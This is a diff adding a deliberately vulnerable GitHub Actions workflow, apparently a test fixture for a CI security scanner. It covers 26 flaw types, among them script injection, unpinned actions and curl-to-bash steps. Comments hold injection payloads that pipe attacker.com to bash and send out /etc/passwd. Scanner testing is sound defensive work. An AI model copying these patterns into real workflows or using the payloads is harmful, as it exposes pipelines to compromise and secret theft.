@@ -1,0 +1,192 @@
+# =============================================================================
+# FlowSec Test Fixture — GitHub Actions: All Vulnerability Patterns
+# This file intentionally contains every detectable GitHub Actions vulnerability
+# to validate that all 26 FlowSec rules fire correctly.
+# =============================================================================
+
+name: Vulnerable GitHub Actions Pipeline
+
+# FS016: workflow_run Trigger — this workflow runs with base-branch permissions
+# even when initiated by a fork's completed workflow. An attacker who controls
+# the triggering workflow can use this to access secrets and push code.
+#
+# FS005: pull_request_target — runs in the context of the base branch with
+# secret access. Combined with actions/checkout of PR code below, this creates
+# a full Poisoned Pipeline Execution (PPE) attack vector.
+#
+# FS013: workflow_dispatch — the 'environment' input is used unquoted in a
+# shell command below, enabling command injection by anyone who can trigger
+# the workflow manually.
+on:
+  push:
+  pull_request_target:
+  workflow_dispatch:
+    inputs:
+      environment:
+        description: 'Deployment target environment'
+        required: true
+  workflow_run:
+    workflows: ["CI"]
+    types: [completed]
+
+# FS003: Excessive Permissions — write-all grants the GITHUB_TOKEN read/write
+# across every repository scope (contents, packages, pull-requests, etc.).
+# A single compromised step can push code, modify releases, or exfiltrate secrets.
+permissions: write-all
+
+jobs:
+
+  build:
+    # FS007: Self-Hosted Runner — persistent machine shared across workflows.
+    # Credentials, malicious code, and cached tokens can survive between jobs
+    # and be accessed by subsequent pipelines on the same runner.
+    runs-on: self-hosted
+
+    # FS006: Missing Timeout — no timeout-minutes means GitHub allows this job
+    # to run for up to 6 hours, enabling cryptomining or resource exhaustion.
+
+    # FS014: Mutable Container Image — ubuntu:latest has no immutable SHA digest.
+    # A push to the registry can silently change the image that gets pulled,
+    # delivering malicious code without any change to this workflow file.
+    container:
+      image: ubuntu:latest
+
+    env:
+      # FS001: Hardcoded Secret — API_KEY is a plaintext credential baked directly
+      # into the workflow file. It's visible to everyone with repo read access,
+      # persists in git history forever, and cannot be rotated without a code change.
+      API_KEY: "abc123secretxyz"
+
+    steps:
+
+      # FS005 (continued): actions/checkout used here inside a pull_request_target
+      # workflow checks out code from the attacker's PR fork. Combined with the
+      # elevated trigger context above, this enables arbitrary secret exfiltration.
+      #
+      # FS002: Unpinned Action — @v3 is a mutable semver tag. The action maintainer
+      # (or an attacker who compromises their account) can push malicious code to
+      # this tag at any time without changing anything in this workflow file.
+      #
+      # FS015: Persist Credentials — no persist-credentials: false means the
+      # GITHUB_TOKEN is written to .git/config after checkout and stays accessible
+      # to every subsequent step, including any injected or compromised action.
+      - uses: actions/checkout@v3
+
+      # FS002 (continued): setup-node pinned by semver tag, not an immutable SHA.
+      - uses: actions/setup-node@v4
+
+      # FS004: Missing OIDC — aws-actions/configure-aws-credentials is used but
+      # permissions does not include id-token: write. Long-lived static AWS keys
+      # stored as secrets are used instead of short-lived federated OIDC tokens.
+      # Leaked keys remain valid until manually rotated.
+      - name: Configure AWS credentials
+        uses: aws-actions/configure-aws-credentials@v2
+        with:
+          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          aws-region: us-east-1
+
+      # FS011: GitHub Context Injection — github.event.issue.title is attacker-
+      # controlled. GitHub substitutes the expression BEFORE the shell parses the
+      # command, so quoting in the YAML provides no protection. An attacker can
+      # create an issue titled '; curl attacker.com | bash' to run arbitrary code.
+      - name: Process issue title
+        run: echo ${{ github.event.issue.title }}
+
+      # FS013: Workflow Dispatch Injection — inputs.environment is used directly
+      # in a shell command without quotes. An attacker who can trigger this workflow
+      # can supply '; curl attacker.com/exfil?t=$(cat /etc/passwd) | bash' as input.
+      - name: Deploy to environment
+        run: ./deploy.sh ${{ inputs.environment }}
+
+      # FS009: Unpinned Dependency — pip and npm install without version pins.
+      # A compromised or typosquatted package at any version can be introduced
+      # on the next run without any change to this file.
+      - name: Install dependencies
+        run: |
+          pip install requests flask boto3
+          npm install express lodash
+
+      # FS010: Secret in Run Command — password= with a hardcoded value appears
+      # in runner logs and in the process list (/proc) on the runner host.
+      #
+      # FS025: Environment Variables in Logs — env and printenv dump all env
+      # vars (including any secrets) to stdout, which is captured in pipeline
+      # logs readable by all repo contributors and sometimes publicly accessible.
+      - name: Debug environment
+        run: |
+          env
+          printenv
+          echo $API_KEY
+          echo password=hardcoded123
+
+      # FS023: Insecure curl — -k disables TLS certificate verification, allowing
+      # an on-path attacker to intercept the connection and replace the response
+      # with a malicious payload that gets executed by the pipeline.
+      #
+      # FS019: Unverified Install Script — the response from get.example.com is
+      # piped directly to bash with no SHA-256 checksum verification. A compromised
+      # CDN, DNS hijack, or BGP route leak can serve a malicious script.
+      #
+      # FS018: Secret as CLI Argument — --token passes the secret inline on the
+      # command line. CLI args are visible in /proc to co-located processes and
+      # are captured in runner audit logs and third-party observability tools.
+      #
+      # FS020: Container Running as Root — docker run without --user defaults to
+      # root inside the container. A container escape vulnerability gives an attacker
+      # full root access to the runner host.
+      #
+      # FS024: Privileged Docker Container — --privileged grants near-unrestricted
+      # host kernel access. Any step running inside this container can escape to the
+      # runner host, access other containers, and modify host network interfaces.
+      #
+      # FS021: Secret in Docker Build Arg — build args are stored unencrypted in
+      # the image layer history (docker history). Anyone who pulls the image can
+      # read the secret with a single command.
+      - name: Build and deploy
+        run: |
+          curl -k https://internal.example.com/setup.sh
+          curl https://get.example.com/install.sh | bash
+          gh release create --token ${{ secrets.GITHUB_TOKEN }} v1.0
+          docker run myapp:latest ./test.sh
+          docker run --privileged myapp:latest ./privileged-scan.sh
+          docker build --build-arg API_KEY=hardcoded123 .
+
+      # FS008: Missing Artifact Signing — docker/build-push-action publishes an
+      # image to a registry but no sigstore/cosign or SLSA step is present.
+      # Consumers downloading this image cannot verify it was produced by this
+      # pipeline and was not substituted or tampered with in transit.
+      - name: Build and push Docker image
+        uses: docker/build-push-action@v5
+        with:
+          push: true
+          tags: myapp:latest
+
+      # FS017: Security Scan Silenced — continue-on-error: true means trivy can
+      # find critical vulnerabilities and the pipeline will still pass and deploy.
+      # The team receives no signal and vulnerable code ships to production.
+      - name: Trivy vulnerability scan
+        uses: aquasecurity/trivy-action@master
+        continue-on-error: true
+
+      # FS022: Broad Artifact Upload — path: . captures the entire workspace,
+      # which may include .env files, temporary AWS credentials, private keys,
+      # and other sensitive data written to disk during earlier steps in the job.
+      - name: Upload workspace as artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: full-workspace-dump
+          path: .
+
+  # FS012: Missing Environment Protection — job name contains 'deploy' but has
+  # no environment: key. Without a GitHub Environment, there is no required-
+  # reviewer gate, no deployment history, and no environment-scoped secrets.
+  #
+  # FS026: Unguarded Deploy — the workflow triggers on pull_request_target
+  # (any PR) with no if: github.ref guard on this job. Any contributor opening
+  # a pull request can trigger a production deployment automatically.
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Deploy to production
+        run: ./deploy.sh
